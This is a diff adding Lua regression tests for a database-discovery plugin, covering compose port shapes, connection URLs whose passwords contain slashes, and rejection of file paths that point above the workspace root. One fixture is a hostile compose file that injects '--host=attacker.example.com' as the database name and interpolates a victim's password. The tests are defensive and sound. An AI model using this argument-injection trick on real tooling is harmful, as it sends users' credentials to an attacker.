@@ -142,6 +142,22 @@ describe('discovery: the workspace walk', function()
     eq(by_name(shallow, 'a/b/c/d/e/f/g/too-deep.sqlite3'), nil)
   end)
 
+  --- All four bounds report, not just two. The depth and hit caps used to prune silently, so a
+  --- project whose databases sit below the depth bound got a confident "found no databases".
+  it('says so when the depth bound or the hit cap pruned something', function()
+    local _, deep = scan(fixture_workspace(), { max_depth = 2 })
+    eq(deep.stats.truncated, true, { fail_reason = 'the depth bound pruned silently' })
+
+    local _, capped = scan(fixture_workspace(), { max_hits = 1 })
+    eq(capped.stats.truncated, true, { fail_reason = 'the hit cap pruned silently' })
+
+    -- A walk that nothing stopped still reports the truth.
+    local shallow = vim.fn.tempname()
+    write(shallow .. '/dev.sqlite3', SQLITE_HEADER)
+    local _, whole = scan(shallow)
+    eq(whole.stats.truncated, false, { fail_reason = 'a complete walk claimed it was truncated' })
+  end)
+
   it('stops at the entry cap and says so', function()
     local _, report = scan(fixture_workspace(), { max_entries = 3 })
     eq(report.stats.truncated, true)
@@ -255,6 +271,56 @@ describe('discovery: docker-compose', function()
     eq(services[1].secret, nil)
   end)
 
+  --- `ports: ["5432:5432"]` is at least as common as the block form. Reading only the block form
+  --- meant a single-service compose file in that style discovered nothing at all.
+  it('reads a published port from every shape a compose file writes one in', function()
+    local SHAPES = {
+      { name = 'inline flow, quoted', text = '    ports: ["55432:5432"]', port = 55432 },
+      { name = 'inline flow, unquoted', text = '    ports: [55432:5432]', port = 55432 },
+      {
+        name = 'inline flow, ip:host:container',
+        text = '    ports: ["127.0.0.1:55432:5432"]',
+        port = 55432,
+      },
+      {
+        name = 'inline flow, two items',
+        text = '    ports: ["8080:80", "55432:5432"]',
+        port = 55432,
+      },
+      { name = 'block, quoted', text = '    ports:\n      - "55432:5432"', port = 55432 },
+      { name = 'block, unquoted', text = '    ports:\n      - 55432:5432', port = 55432 },
+      {
+        name = 'block, ip:host:container',
+        text = '    ports:\n      - "127.0.0.1:55432:5432"',
+        port = 55432,
+      },
+    }
+    for _, shape in ipairs(SHAPES) do
+      local text = 'services:\n  db:\n    image: postgres:16\n' .. shape.text .. '\n'
+      local services = compose.parse(text, { source = 'compose.yml' })
+      eq(#services, 1, { fail_reason = ('%s produced no candidate'):format(shape.name) })
+      eq(services[1].target.port, shape.port, { fail_reason = shape.name })
+    end
+  end)
+
+  it('reads an inline-flow environment list too', function()
+    local text = 'services:\n  db:\n    image: mysql:8\n    ports: ["3307:3306"]\n'
+      .. '    environment: ["MYSQL_DATABASE=shop", "MYSQL_USER=ada"]\n'
+    local services = compose.parse(text, { source = 'compose.yml' })
+    eq(#services, 1)
+    eq(services[1].target.database, 'shop')
+    eq(services[1].target.user, 'ada')
+  end)
+
+  it('publishes nothing for a container-only port, in either shape', function()
+    for _, ports in ipairs({ '    ports: ["5432"]', '    ports:\n      - "5432"' }) do
+      local text = 'services:\n  db:\n    image: postgres:16\n' .. ports .. '\n'
+      eq(#compose.parse(text, { source = 'compose.yml' }), 0, {
+        fail_reason = 'an ephemeral host port is not a target dblens can offer',
+      })
+    end
+  end)
+
   it('reads the long port form, and knows which files are compose files', function()
     local text = 'services:\n  db:\n    image: postgres\n    ports:\n'
       .. '      - target: 5432\n        published: 5445\n        protocol: tcp\n'
@@ -301,6 +367,31 @@ describe('discovery: connection URLs', function()
     local target = url.parse('postgres://us%20er:p%40ss%2Fword@host/db')
     eq(target.user, 'us er')
     eq(target.secret, 'p@ss/word')
+  end)
+
+  --- An unencoded `/` in a password is invalid per RFC but routine in a real `.env`, and splitting
+  --- the authority on the first `/` framed the password as the host: the user's own database then
+  --- either never appeared, or appeared pointing somewhere it never meant.
+  it('finds the host and the database when the password holds a `/`', function()
+    local target = url.parse('postgres://user:aB3/xY9+z@db.example.com:5432/app')
+    eq(target.host, 'db.example.com')
+    eq(target.port, 5432)
+    eq(target.user, 'user')
+    eq(target.database, 'app')
+    eq(target.secret, 'aB3/xY9+z')
+
+    local my = url.parse('mysql://root:tOp/Secret@127.0.0.1:3306/shop')
+    eq(my.host, '127.0.0.1')
+    eq(my.database, 'shop')
+    eq(my.secret, 'tOp/Secret')
+  end)
+
+  it('still reads an ordinary `@` in the path as part of the database name', function()
+    local target = url.parse('postgres://db.example.com/app@v2')
+    eq(target.host, 'db.example.com')
+    eq(target.database, 'app@v2')
+    eq(url.parse('postgres://ada@db.example.com/app@v2').user, 'ada')
+    eq(url.parse('postgres://ada@db.example.com/app@v2').database, 'app@v2')
   end)
 
   it('is not fooled by a URL that is not a database', function()
@@ -446,6 +537,74 @@ describe('discovery: what a candidate becomes', function()
     local found, report = scan(root)
     eq(#found, 0)
     eq(report.skipped, 1)
+  end)
+
+  --- "never reads above the workspace root" is stated in the module header, the README and the
+  --- CHANGELOG. The WALK honoured it; a path a `.env` NAMED did not, and `sqlite:///../x.db`
+  --- resolved straight out of the project.
+  it('drops a discovered file path that resolves above the workspace root', function()
+    local base = vim.fn.tempname()
+    local outside = base .. '/outside'
+    write(outside .. '/secret.db', SQLITE_HEADER)
+    local absolute_outside = vim.fs.normalize(assert(vim.uv.fs_realpath(outside .. '/secret.db')))
+
+    local ESCAPES = {
+      'sqlite:///../outside/secret.db',
+      'sqlite://../outside/secret.db',
+      'sqlite://' .. absolute_outside,
+      'duckdb:///' .. absolute_outside,
+    }
+    for index, spelling in ipairs(ESCAPES) do
+      local root = ('%s/project%d'):format(base, index)
+      write(root .. '/.env', ('T%d=%s\n'):format(index, spelling))
+      local found, report = scan(root)
+      eq(#found, 0, { fail_reason = ('`%s` was offered'):format(spelling) })
+      eq(report.skipped >= 1, true, {
+        fail_reason = ('`%s` was dropped silently'):format(spelling),
+      })
+    end
+  end)
+
+  it('still offers a file path that stays inside the workspace', function()
+    -- Under `vendor/`, which the walk skips, so the surviving candidate is the `.env` one and the
+    -- assertion is about containment rather than about the walk finding the file itself.
+    local root = vim.fn.tempname()
+    write(root .. '/vendor/dev.sqlite3', SQLITE_HEADER)
+    write(root .. '/.env', 'DATABASE_URL=sqlite://vendor/dev.sqlite3\n')
+    local found, report = scan(root)
+    eq(report.skipped, 0, { fail_reason = 'containment dropped a path inside the root' })
+    eq(by_name(found, 'DATABASE_URL') ~= nil, true)
+    eq(by_name(found, 'DATABASE_URL').target.path, root .. '/vendor/dev.sqlite3')
+  end)
+
+  --- The whole exfiltration chain the review executed: a hostile compose file names a service
+  --- something plausible, puts an option in the field that becomes argv, and interpolates the
+  --- victim's own environment for the password.
+  it('drops a candidate whose database is an option, rather than offering it', function()
+    local root = vim.fn.tempname()
+    write(
+      root .. '/docker-compose.yml',
+      table.concat({
+        'services:',
+        '  db:',
+        '    image: mysql:8',
+        -- Block form on purpose: the drop must be the validation rule, not the port parse.
+        '    ports:',
+        '      - "3306:3306"',
+        '    environment:',
+        '      MYSQL_DATABASE: --host=attacker.example.com',
+        '      MYSQL_USER: root',
+        '      MYSQL_PASSWORD: ${DBLENS_TEST_VICTIM_SECRET}',
+        '',
+      }, '\n')
+    )
+    local previous = vim.env.DBLENS_TEST_VICTIM_SECRET
+    vim.env.DBLENS_TEST_VICTIM_SECRET = 'victims-real-production-password'
+    local found, report = scan(root)
+    vim.env.DBLENS_TEST_VICTIM_SECRET = previous
+
+    eq(#found, 0, { fail_reason = 'an option-like database was offered as a connection' })
+    eq(report.skipped, 1, { fail_reason = 'the hostile candidate was dropped silently' })
   end)
 end)
 
